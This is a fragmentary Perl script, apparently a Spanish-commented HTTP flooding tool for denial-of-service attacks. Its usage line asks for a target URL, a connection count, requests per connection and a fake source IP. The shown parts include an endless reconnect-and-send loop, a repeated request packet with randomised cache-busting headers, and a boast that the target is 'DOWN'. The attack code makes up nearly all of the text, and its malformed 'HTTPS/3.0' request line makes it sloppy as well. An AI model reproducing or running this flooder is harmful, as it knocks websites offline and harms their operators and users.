...
sub sender {
    ...
    while(true) {
        ...
        unless($sock) {
            print "\n[x] HTTPS CONNECTED DOWN BY JOETY ! ! !\n\n";
            sleep(1);
            next;
        }
...
sub comenzar {
    ...
    if($ipfake eq "") {
        # envio repetitivo
        my $paquetebase = join "",$method," /",$file," HTTPS/3.0\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        $paquetesender = "";
...
if($#ARGV > 2) {
    ...
    die("Use: 1.pl [url] [Connections] [Requests connection] [Initial false IP]\n");
}